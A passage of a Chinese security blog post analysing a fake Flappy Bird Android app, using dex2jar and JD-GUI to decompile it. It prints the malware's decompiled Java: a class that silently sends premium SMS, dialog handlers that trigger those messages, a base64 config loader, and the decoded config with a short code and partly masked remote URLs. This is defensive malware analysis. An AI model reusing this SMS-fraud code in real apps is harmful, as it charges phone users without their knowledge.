+<pre class="prettyprint">sh /home/user/dex2jar-version/d2j-dex2jar.sh /home/user/flappy-bird.apk</pre>
+<p style="text-indent:2em;">
+	将会生成一个可以使用JD-GUI打开的jar文件。
+</p>
+<p style="text-indent:2em;">
+	从http://jd.benow.ca/#jd-gui-download<a href="http://jd.benow.ca/#jd-gui-download" target="_blank">enter link description here</a>下载并解压JD-GUI。
+</p>
+<pre class="prettyprint">tar -zxvf jd-gui-version.linux.i686.tar.gz</pre>
+<p style="text-indent:2em;">
+	运行打开JD-GUI载入Flappy Bird的jar文件，看到内容如下：
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/4171_1.png" target="_blank"><img title="打开JD-GUI载入Flappy Bird的jar文件" alt="打开JD-GUI载入Flappy Bird的jar文件" src="/file/old/4171_1.png" width="780" height="500" /></a> 
+</p>
+<p style="text-indent:2em;">
+	寻找左边的类文件列表，其中有一个在utilities包下的SendSMS类，看起来很像是一个发送短信的类。
+</p>
+<p>
+	<strong>SendSMS.class</strong> 
+</p>
+<pre class="prettyprint lang-java">package com.hdc.ultilities;
+
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.telephony.SmsManager;
+import android.util.Log;
+import android.widget.Toast;
+
+public class SendSMS
+{
+  public static String address;
+  public static String dauso_last;
+  public static String dauso_x;
+  public static int discount;
+
+  public static void send(String paramString1, String paramString2, Context paramContext, String paramString3, int paramInt, String paramString4)
+  {
+    address = paramString2.trim();
+    discount = paramInt;
+    dauso_x = paramString3;
+    dauso_last = paramString4;
+    new Thread(new Runnable(paramContext, paramString1)
+    {
+      public void run()
+      {
+        try
+        {
+          PendingIntent localPendingIntent1 = PendingIntent.getBroadcast(SendSMS.this, 0, new Intent("SMS_SENT"), 0);
+          PendingIntent localPendingIntent2 = PendingIntent.getBroadcast(SendSMS.this, 0, new Intent("SMS_DELIVERED"), 0);
+          SmsManager localSmsManager = SmsManager.getDefault();
+          SendSMS.this.registerReceiver(new BroadcastReceiver(SendSMS.this, this.val$data)
+          {
+            public void onReceive(Context paramContext, Intent paramIntent)
+            {
+              switch (getResultCode())
+              {
+              case 0:
+              case 2:
+              case 3:
+              case 4:
+              default:
+              case -1:
+              case 1:
+              }
+              do
+              {
+                return;
+                Toast.makeText(this.val$instance, "G?i thành công", 0).show();
+                Log.i("dau so: " + SendSMS.dauso_x, SendSMS.dauso_x + SendSMS.discount + SendSMS.dauso_last);
+                return;
+                SendSMS.discount = -1 + SendSMS.discount;
+              }
+              while (SendSMS.discount &lt; 0);
+              Toast.makeText(this.val$instance, "G?i ko ???c", 0).show();
+              Log.i("dau so: " + SendSMS.dauso_x, SendSMS.dauso_x + SendSMS.discount + SendSMS.dauso_last);
+              SendSMS.send(this.val$data, SendSMS.dauso_x + SendSMS.discount + SendSMS.dauso_last, this.val$instance, SendSMS.dauso_x, SendSMS.discount, SendSMS.dauso_last);
+            }
+          }
+          , new IntentFilter("SMS_SENT"));
+          localSmsManager.sendTextMessage(SendSMS.address, null, this.val$data, localPendingIntent1, localPendingIntent2);
+          return;
+        }
+        catch (Exception localException)
+        {
+          localException.printStackTrace();
+        }
+      }
+    }).start();
+  }
+}</pre>
+<p style="text-indent:2em;">
+	下面这段代码负责发送短信：
+</p>
+<pre class="prettyprint lang-java">localSmsManager.sendTextMessage(SendSMS.address, null, this.val$data, localPendingIntent1, localPendingIntent2);</pre>
+<p style="text-indent:2em;">
+	这两段代码是隐藏短信发送与到达通知：
+</p>
+<pre class="prettyprint lang-java">PendingIntent localPendingIntent1 = PendingIntent.getBroadcast(SendSMS.this, 0, new Intent("SMS_SENT"), 0);
+PendingIntent localPendingIntent2 = PendingIntent.getBroadcast(SendSMS.this, 0, new Intent("SMS_DELIVERED"), 0);</pre>
+<p style="text-indent:2em;">
+	sendTextMessage方法是Android其中一个API（参阅<a href="http://developer.android.com/reference/android/telephony/gsm/SmsManager.html#sendTextMessage%28java.lang.String,%20java.lang.String,%20java.lang.String,%20android.app.PendingIntent,%20android.app.PendingIntent%29" target="_blank">android.telephony.gsm.SmsManager</a> ）。
+</p>
+<p style="text-indent:2em;">
+	根据这个，我们可以明确的知道程序发送短信以及隐藏相关操作的代码。
+</p>
+<p style="text-indent:2em;">
+	下一个问题就是，这个短信是什么时候发送的呢，是由用户触发的还是其他的呢？
+</p>
+<p style="text-indent:2em;">
+	来看一下<strong>MainActivity.class</strong>文件：
+</p>
+<p>
+	<strong>MainActivity.class: Global Variables Snippet</strong> 
+</p>
+<pre class="prettyprint">public String pop_up1 = "B?ng cách cài ??t và s? d?ng trò ch?i, ph?n m?m này, b?n ???c coi nh? ?ã ch?p nh?n các ?i?u kho?n s? d?ng d??i ?ây c?a chúng tôi: \n1. Không g? b? ho?c vô hi?u hóa b?t k? bi?n pháp b?o v?, quy?n s? h?u hay b?n quy?n có trên ho?c trong trò ch?i, ph?n m?m \n2. Không t?o ra các b?n sao b?t ch??c các tính n?ng ho?c giao di?n, d? li?u c?a trò ch?i, ph?n m?m này.\n3. Không s? d?ng trò ch?i, ph?n m?m này làm công c? ?? gây h?i cho nh?ng ng??i dùng khác.\n4. S?n ph?m có phí và b?n c?n thanh toán ?? ti?p t?c s? d?ng sau th?i gian dùng th?.\n5. Phí s? d?ng s?n ph?m t? 15.000 ? ??n 30.000 ?.";
+public String pop_up2 = "   B?n có mu?n kích ho?t không?";</pre>
+<p style="text-indent:2em;">
+	这两个字符串都为越南文，根据google翻译：
+</p>
+<p style="text-indent:2em;">
+	pop_up1：“通过安装和使用游戏，软件，你将被视为已接受了我们的使用下面的条款： 不要删除或禁用任何防护措施，或在游戏中所有权或著作权，软件。 不要创建重复或模仿界面功能，游戏数据，此软件。 不要使用游戏，软件作为一种工具来造成危害其他用户。 我们的产品是免费的，你需要付费才能继续试用期后使用。 收费使用的产品从15,000越盾30,000越盾。“ pop_up2：“你想要激活吗”
+</p>
+<p style="text-indent:2em;">
+	这些看起来像标准条款和条件，只是Flappy Bird是一个免费的应用程序，所以不应该花费。有趣的是在15000的花费与上面访问的URL应该是一样的：http://210.<strong><em>.</em></strong>.195/bookmark/getServiceCode?price=15000）。
+</p>
+<p style="text-indent:2em;">
+	后来在<strong>MainActivity.class</strong>文件的<strong>initListView</strong>中找到产生这些对话伴并随着一些发送短信动作代码。下面是从类文件中的代码摘录：
+</p>
+<p>
+	<strong>MainActivity.class: Code Extract</strong> 
+</p>
+<pre class="prettyprint lang-java">while (Service_mLink.number_send == 1)
+    {
+      openPop_up(this.pop_up1, Service_mLink.number_send, 1);
+      this.listView.setOnItemClickListener(new AdapterView.OnItemClickListener()
+      {
+        public void onItemClick(AdapterView&lt;?&gt; paramAdapterView, View paramView, int paramInt, long paramLong)
+        {
+          Integer localInteger = Integer.valueOf(0);
+          MainActivity.linkInfo = new LinkInfo();
+          MainActivity.linkInfo = (LinkInfo)Service_mLink.instance.listLinkInfo.get(paramInt);
+          MainActivity.this.link = MainActivity.linkInfo.getLink();
+          MainActivity.this.mo = MainActivity.linkInfo.getMo();
+          MainActivity.this.servicecode = Service_mLink.svcodeActive;
+          MainActivity.this.servicecode2 = MainActivity.linkInfo.getServicecode2();
+          if (localInteger.intValue() == 0)
+            MainActivity.this.isFirstTime = FileManager.loadFtime(MainActivity.this, MainActivity.this.ftime);
+          while ((MainActivity.this.servicecode.equals("")) &amp;&amp; (MainActivity.this.servicecode2.equals("")))
+          {
+            Log.e("servicecodeAll", MainActivity.this.servicecode + "sv : sv2" + MainActivity.this.servicecode2);
+            MainActivity.DownloadFileFromURL localDownloadFileFromURL = new MainActivity.DownloadFileFromURL(MainActivity.this);
+            String[] arrayOfString = new String[2];
+            arrayOfString[0] = MainActivity.this.link;
+            arrayOfString[1] = MainActivity.linkInfo.getTitle();
+            localDownloadFileFromURL.execute(arrayOfString);
+            return;
+            Integer.valueOf(1 + localInteger.intValue());
+          }
+          if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
+            MainActivity.this.checkSVCode(MainActivity.this.servicecode2);
+          while (true)
+          {
+            AlertDialog.Builder localBuilder = new AlertDialog.Builder(MainActivity.this);
+            TextView localTextView = new TextView(MainActivity.this);
+            localTextView.setText(MainActivity.this.txt_content);
+            localTextView.setGravity(1);
+            localTextView.setTextColor(Color.parseColor("#ffffff"));
+            localBuilder.setView(localTextView);
+            localBuilder.setPositiveButton("Ok", new DialogInterface.OnClickListener()
+            {
+              public void onClick(DialogInterface paramDialogInterface, int paramInt)
+              {
+                if (Service_mLink.instance.isSim)
+                {
+                  MainActivity.this.checkInternet();
+                  if (MainActivity.this.isConnect)
+                  {
+                    if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
+                      SendSMS.send(MainActivity.this.mo, MainActivity.this.servicecode2, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+                    try
+                    {
+                      while (true)
+                      {
+                        Toast.makeText(MainActivity.this.getApplicationContext(), "Ca?m ?n ba?n ?a? s?? du?ng di?ch vu?", 1000).show();
+                        Thread.sleep(1000L);
+                        paramDialogInterface.cancel();
+                        MainActivity.DownloadFileFromURL localDownloadFileFromURL = new MainActivity.DownloadFileFromURL(MainActivity.this);
+                        String[] arrayOfString = new String[2];
+                        arrayOfString[0] = MainActivity.this.link;
+                        arrayOfString[1] = MainActivity.linkInfo.getTitle();
+                        localDownloadFileFromURL.execute(arrayOfString);
+                        return;
+                        SendSMS.send(MainActivity.this.mo, MainActivity.this.servicecode, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+                      }
+                    }
+                    catch (InterruptedException localInterruptedException)
+                    {
+                      while (true)
+                        localInterruptedException.printStackTrace();
+                    }
+                  }
+                  AlertDialog.Builder localBuilder = new AlertDialog.Builder(MainActivity.this);
+                  localBuilder.create();
+                  localBuilder.setTitle("Thông báo");
+                  localBuilder.setMessage("B?n vui lòng ki?m tra k?t n?i Internet !!!");
+                  localBuilder.show();
+                  return;
+                }
+                Toast.makeText(MainActivity.this, "B?n ?ã không có Sim ?i?n tho?i.\n B?n không th? kích ho?t và s? d?ng App ???c !!!", 1000).show();
+              }
+            });
+            localBuilder.setNegativeButton("Cancel", new DialogInterface.OnClickListener()
+            {
+              public void onClick(DialogInterface paramDialogInterface, int paramInt)
+              {
+                paramDialogInterface.cancel();
+              }
+            });
+            localBuilder.show();
+            return;
+            MainActivity.this.checkSVCode(MainActivity.this.servicecode);
+          }
+        }
+      });
+      return;
+      label249: checkSVCode(Service_mLink.svcodeActive);
+    }</pre>
+<p style="text-indent:2em;">
+	看起来一旦用户点击了“确定”，就将会发送短信，代码中一共包含两个
+</p>
+<pre class="prettyprint lang-java">SendSMS.send(MainActivity.this.mo, MainActivity.this.servicecode, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);</pre>
+<p style="text-indent:2em;">
+	但是第二个是在return的后面，也就意味着不会执行，但是为什么动态分析当中看到了两次发送短信呢？
+</p>
+<p style="text-indent:2em;">
+	上面代码中的第三行调用了openPop_up方法，来看看其中的代码：
+</p>
+<p>
+	<strong>MainMethod.class: method openPop_up</strong> 
+</p>
+<pre class="prettyprint lang-java">public void openPop_up(String paramString, int paramInt1, int paramInt2)
+  {
+    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
+    View localView = LayoutInflater.from(this).inflate(2130903043, null);
+    this.tvlaw = ((TextView)localView.findViewById(2131230726));
+    this.tvlaw.setText(paramString);
+    this.tvlaw.setTextColor(-1);
+    if (paramInt2 == 1)
+      localBuilder.setTitle("?i?u kho?n s? d?ng");
+    localBuilder.setView(localView);
+    localBuilder.setPositiveButton("Ok", new DialogInterface.OnClickListener(paramInt2, paramInt1)
+    {
+      public void onClick(DialogInterface paramDialogInterface, int paramInt)
+      {
+        if (Service_mLink.instance.isSim)
+        {
+          if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
+          {
+            SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+            Log.i("i", this.val$i);
+            if (Service_mLink.instance.listLinkInfo.size() != 1)
+              break label345;
+            if ((this.val$number_send == 1) &amp;&amp; (this.val$i == 1))
+            {
+              FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+              MainActivity.DownloadFileFromURL localDownloadFileFromURL2 = new MainActivity.DownloadFileFromURL(MainActivity.this);
+              String[] arrayOfString2 = new String[2];
+              arrayOfString2[0] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink();
+              arrayOfString2[1] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle();
+              localDownloadFileFromURL2.execute(arrayOfString2);
+            }
+            if ((this.val$number_send == 2) &amp;&amp; (this.val$i == 2))
+            {
+              FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+              MainActivity.DownloadFileFromURL localDownloadFileFromURL1 = new MainActivity.DownloadFileFromURL(MainActivity.this);
+              String[] arrayOfString1 = new String[2];
+              arrayOfString1[0] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink();
+              arrayOfString1[1] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle();
+              localDownloadFileFromURL1.execute(arrayOfString1);
+            }
+          }
+          while (true)
+          {
+            paramDialogInterface.cancel();
+            return;
+            SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+            break;
+            label345: if ((this.val$number_send == 1) &amp;&amp; (this.val$i == 1))
+              FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+            if ((this.val$number_send != 2) || (this.val$i != 2))
+              continue;
+            FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+          }
+        }
+        Toast.makeText(MainActivity.this, "B?n ?ã không có Sim ?i?n tho?i.\n B?n không th? kích ho?t và s? d?ng App ???c !!!", 1000).show();
+      }
+    });
+    localBuilder.setNegativeButton("Cancel", new DialogInterface.OnClickListener(paramInt2, paramInt1)
+    {
+      public void onClick(DialogInterface paramDialogInterface, int paramInt)
+      {
+        if (this.val$i == 1)
+          try
+          {
+            MainActivity.this.auto_sms = DownloadImage.instance.getAuto_sms2(Service_mLink.url_config_auto_sms);
+            Log.i("auto_sms", MainActivity.this.auto_sms);
+            if (Service_mLink.instance.isSim)
+            {
+              boolean bool = MainActivity.this.auto_sms.equals("1");
+              int i = 0;
+              if (bool)
+              {
+                if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
+                {
+                  SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+                  i = 1;
+                }
+              }
+              else
+              {
+                Log.i("i", this.val$i);
+                if (Service_mLink.instance.listLinkInfo.size() != 1)
+                  break label450;
+                if ((this.val$number_send == 1) &amp;&amp; (this.val$i == 1))
+                {
+                  FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+                  MainActivity.DownloadFileFromURL localDownloadFileFromURL2 = new MainActivity.DownloadFileFromURL(MainActivity.this);
+                  String[] arrayOfString2 = new String[2];
+                  arrayOfString2[0] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink();
+                  arrayOfString2[1] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle();
+                  localDownloadFileFromURL2.execute(arrayOfString2);
+                }
+                if ((this.val$number_send == 2) &amp;&amp; (this.val$i == 2))
+                {
+                  FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+                  MainActivity.DownloadFileFromURL localDownloadFileFromURL1 = new MainActivity.DownloadFileFromURL(MainActivity.this);
+                  String[] arrayOfString1 = new String[2];
+                  arrayOfString1[0] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink();
+                  arrayOfString1[1] = ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle();
+                  localDownloadFileFromURL1.execute(arrayOfString1);
+                }
+                paramDialogInterface.cancel();
+                if (i == 0)
+                {
+                  if (!Service_mLink.link_redirect.equals(""))
+                    MainActivity.this.startWebsite(Service_mLink.link_redirect);
+                  System.exit(1);
+                }
+                return;
+              }
+            }
+          }
+          catch (Exception localException)
+          {
+            while (true)
+            {
+              MainActivity.this.auto_sms = "0";
+              continue;
+              SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_dauso_X, MainActivity.this.type_discount, MainActivity.this.type_last);
+              continue;
+              label450: if ((this.val$number_send == 1) &amp;&amp; (this.val$i == 1))
+                FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+              if ((this.val$number_send != 2) || (this.val$i != 2))
+                continue;
+              FileManager.saveFTime(MainActivity.this, "mlink_x5", MainActivity.this.ftime);
+            }
+            Toast.makeText(MainActivity.this, "B?n ?ã không có Sim ?i?n tho?i.\n B?n không th? kích ho?t và s? d?ng App ???c !!!", 1000).show();
+            return;
+          }
+        paramDialogInterface.cancel();
+        if (!Service_mLink.link_redirect.equals(""))
+          MainActivity.this.startWebsite(Service_mLink.link_redirect);
+        System.exit(1);
+      }
+    });
+    localBuilder.show();
+  }</pre>
+<p style="text-indent:2em;">
+	因此，在创建弹出对话时，该方法触发了发送短信，这可以解释为什么我们的动态分析时，发出了两个短信。
+</p>
+<p style="text-indent:2em;">
+	现在还有个问题就是没有看到短信从哪里发送的，没有看到短信的号码，短信内容，以及访问的URL是在哪里定义的。
+</p>
+<p style="text-indent:2em;">
+	在app的源代码中找到了一些线索，如何解码一个配置文件内容，特别是一个叫<strong>getInfoFromFile</strong>方法。
+</p>
+<p>
+	<strong>MainActivity.class: getInfoFromFile()</strong> 
+</p>
+<pre class="prettyprint lang-java">private void getInfoFromFile()
+  {
+    new ArrayList();
+    ArrayList localArrayList = FileManager.loadfileExternalStorage(this, 2130837505);
+    try
+    {
+      this.strDecode = new String(Base64.decode(((String)localArrayList.get(0)).toString()));
+      Service_mLink.instance.getCategory(this.strDecode);
+      this.have_img = readImage();
+      this.isFirstTime = FileManager.loadFtime(this, this.ftime);
+      return;
+    }
+    catch (Exception localException)
+    {
+      localException.printStackTrace();
+    }
+  }</pre>
+<p style="text-indent:2em;">
+	可以看到其功能为读取文件base64解码处理。
+</p>
+<p style="text-indent:2em;">
+	仔细查看APK文件，在res目录下有一个drawable-hdpi的目录，在这个目录下有一个config文件，为base64编码的。
+</p>
+<p style="text-indent:2em;">
+	解码config文件:
+</p>
+<pre class="prettyprint lang-js">{
+  "sv_code_active": "7740",
+  "sv_code_active_2": "7740",
+  "mo_active": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+  "bm_name": "Flappy bird",
+  "header_color": "#1E8CBE",
+  "background_color": "#F0F0F0",
+  "font_header_color": "#F0F0F0",
+  "font_item_color": "#333333",
+  "number_send": "2",
+  "type_display": "1",
+  "include_sdk": "0",
+  "link_redirect": "http://choi****game.cu****h.mobi",
+  "items": [
+    {
+      "serviceCode": "7740",
+      "serviceCode2": "7740",
+      "mo": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+      "title": "Flappy bird",
+      "link_icon": "http://cu****h.mobi/upload/bookmark/2014/0208/flappy_1.jpg",
+      "link": "http://andr****ot.net/app/flappy.apk"
+    }
+  ],
+  "url_config_auto_sms": "http://cu****h.mobi/bookmark/getConfigSendSMS",
+  "url_get_sv_code": "http://cuc****.mobi/bookmark/getServiceCode?price=15000"
+}</pre>
+<p style="text-indent:2em;">
+	到此基本都了解到了，进一步看了flappy.apk文件看看具体是做什么的，好像也只是个发送短信扣费的应用。
+</p>
+<p>
+	<strong>0x03 总结</strong> 
+</p>
+<p style="text-indent:2em;">
+	事实证明，这个Flappy Bird是一个恶意应用，发送付费短信，并会下载其他恶意的应用。
+</p>
+<p style="text-indent:2em;">
+	此次检测用到的工具都是免费的工具可以下载到。
+</p>
+<p style="text-indent:2em;">
+	from:<a href="http://securehoney.net/blog/how-to-dissect-android-flappy-bird-malware.html#.UzFS7q1Wc0k" target="_blank">enter link description here</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="http://drops.wooyun.org/tips/1314" target="_blank">[原文地址]</a>
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">爱小狐狸的小螃蟹</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2014-04-05
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E6%81%B6%E6%84%8F/">恶意</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/android/">Android</a>
+          <a href="https://lcx.cc/tags/cmd/">Cmd</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/google/">Google</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ids/">IDS</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/linux/">Linux</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E7%9F%AD%E4%BF%A1/">短信</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E5%8F%B7%E7%A0%81/">号码</a>
+          <a href="https://lcx.cc/tags/%E8%A7%A3%E7%A0%81/">解码</a>
+          <a href="https://lcx.cc/tags/%E5%85%8D%E8%B4%B9/">免费</a>
+          <a href="https://lcx.cc/tags/%E6%A8%A1%E6%8B%9F/">模拟</a>
+          <a href="https://lcx.cc/tags/%E8%BD%AF%E4%BB%B6/">软件</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E9%9A%90%E8%97%8F/">隐藏</a>
+          <a href="https://lcx.cc/tags/%E6%B8%B8%E6%88%8F/">游戏</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/4274/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">论防刷票、恶意提交表单：公司网站被恶意提交订单，看你如何解决？</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/4272/">
+            <span class="next-text nav-default">2014 最新 web qq 密码的加密方式分析过程，WebQQ 登陆密码加密算法分析</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 